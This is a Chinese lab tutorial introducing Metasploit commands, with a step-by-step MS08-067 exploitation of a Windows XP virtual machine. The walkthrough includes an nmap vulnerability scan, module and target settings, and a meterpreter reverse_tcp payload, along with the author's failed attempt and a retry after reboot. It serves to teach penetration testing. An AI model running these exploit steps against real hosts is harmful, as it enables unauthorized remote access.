ailx10说：这篇是在2022年1月之前写的，后来又改过。第一次摸 Metasploit，很容易被一长串模块和参数弄得只会照抄命令。我就用 Win7 的 MS17-010 和 XP 的 MS08-067 两个教学例子，按模块、目标、参数、载荷的顺序走一遍，看看每一步是在告诉工具什么。XP 那段并没有一次成功，中间失败了，重启后才又跑通，这些输出我也留了下来。对我来说，这篇最实在的部分不是“工具很强”，而是把一次失败重新拆开，分清环境状态和参数选择，免得只记住最后那张成功截图。

原记录中的扫描地址与靶机地址不一致，相关命令仅作为历史记录，复现实验前必须按实际靶机地址核对。

在**kali虚拟机**中打开**metasploit**，命令行输入：`msfconsole`

Metasploit 提供利用、辅助和载荷等模块。本例回顾 Win7 的 MS17-010 与 XP 的 MS08-067 历史实验，侧重理解模块配置与结果。

- **虚拟机WIN7**-192.168.0.102
- **虚拟机Kali**-192.168.0.103

![](/notes-assets/4e055d013216d4af8f0f.jpg)

## show exploits

- 显示漏洞利用模块
- 自带约2000个

![](/notes-assets/9aa3cc7030bb7b422958.jpg)

## show auxiliary

- 显示辅助模块，一般是扫描、拒绝服务、Fuzz测试
- 自带约1000个

![](/notes-assets/53c8bc5b183ab3c69522.jpg)

## show options（或者直接输入：options）

- 显示当前模块需要的参数
- **back** 命令，回退到上一个状态
- **search** 命令，搜索相关的渗透测试模块

![](/notes-assets/8c9fe18b38e6341d397e.jpg)

## show payloads

- 显示当前模块支持的载荷

![](/notes-assets/12dea230175b21d47db1.jpg)

## show targets

- 显示能被漏洞利用的主机类型

![](/notes-assets/feb3f71d371f394102c3.webp)

## info

- 显示当前模块的完整详细信息

![](/notes-assets/ca59aca0c6a72f4fd055.jpg)

## set(unset)

- 设置（取消）字段的值
- 对于Required标记为yes的字段，必须要设置

![](/notes-assets/bdb64d64c51ca6634e97.jpg)

## run（或者输入：exploit）

- 向目标主机发射攻击载荷
- **set payload** 设置载荷路径

![](/notes-assets/30861cf25cca5671d9b5.jpg)

第一组截图记录了一次会话建立，其他环境的结果可能不同。

- **虚拟机XP**-192.168.0.107
- **虚拟机Kali**-192.168.0.103

第一步：Nmap漏洞探测

```
nmap -sT -A --script=smb-vuln-ms08-067 -P0 192.168.0.102
```

-sT 使用完整的 TCP connect 扫描，不能称为隐蔽扫描；-A 启用一组较积极的探测功能。
![](/notes-assets/f51a8cff9aab9fad74cd.jpg)

第二步：进入漏洞利用模块，并查看需要设置的字段

```
msf5 > 

msf5 > use exploit/windows/smb/ms08_067_netapi 

msf5 exploit(windows/smb/ms08_067_netapi) > 

msf5 exploit(windows/smb/ms08_067_netapi) > options 



Module options (exploit/windows/smb/ms08_067_netapi):



   Name     Current Setting  Required  Description

   ----     ---------------  --------  -----------

   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'

   RPORT    445              yes       The SMB service port (TCP)

   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)





Exploit target:



   Id  Name

   --  ----

   0   Automatic Targeting
```

![](/notes-assets/047bfa55b1aed3ca79c7.jpg)

第三步：设置目标主机IP地址，并查看目标主机类型

```
msf5 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.0.107

RHOSTS => 192.168.0.107

msf5 exploit(windows/smb/ms08_067_netapi) > show targets 



Exploit targets:



   Id  Name

   --  ----

   0   Automatic Targeting

   9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)

   10  Windows XP SP2 Chinese - Simplified (NX)

   11  Windows XP SP2 Chinese - Traditional (NX)

   33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)

   34  Windows XP SP3 Chinese - Simplified (NX)

   35  Windows XP SP3 Chinese - Traditional (NX)
```

![](/notes-assets/6e6dd60d20dd45b03d99.jpg)

第四步：设置目标主机类型，并检查Required字段全部填充完毕，Attack～

```
msf5 exploit(windows/smb/ms08_067_netapi) > set target 34

target => 34

msf5 exploit(windows/smb/ms08_067_netapi) > show options 



Module options (exploit/windows/smb/ms08_067_netapi):



   Name     Current Setting  Required  Description

   ----     ---------------  --------  -----------

   RHOSTS   192.168.0.107    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'

   RPORT    445              yes       The SMB service port (TCP)

   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)





Payload options (windows/meterpreter/reverse_tcp):



   Name      Current Setting  Required  Description

   ----      ---------------  --------  -----------

   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)

   LHOST     192.168.0.103    yes       The listen address (an interface may be specified)

   LPORT     4444             yes       The listen port





Exploit target:



   Id  Name

   --  ----

   34  Windows XP SP3 Chinese - Simplified (NX)
```

漏洞利用失败是经常的事，不必灰心，大不了换个主机（姿势），再来一次～

原实验记录目标主机异常、端口关闭；原因未确认。
![](/notes-assets/938d48355e1758c48ef0.jpg)

原实验重启目标后再次运行并记录成功；这不能证明所有失败都由同一环境问题导致。
![](/notes-assets/53cb1e2c825f7a32cb0a.jpg)

可以保存实验配置，但应避免将凭据或敏感信息写入共享文件。

![](/notes-assets/db92033fd5e09653c6fe.webp)

这次有失败，也有重启后看到结果的经历。把前后状态留下来，比简单写一句“环境问题”更有用，因为真正值得追的是，哪一个条件改变以后链路才走了下去。
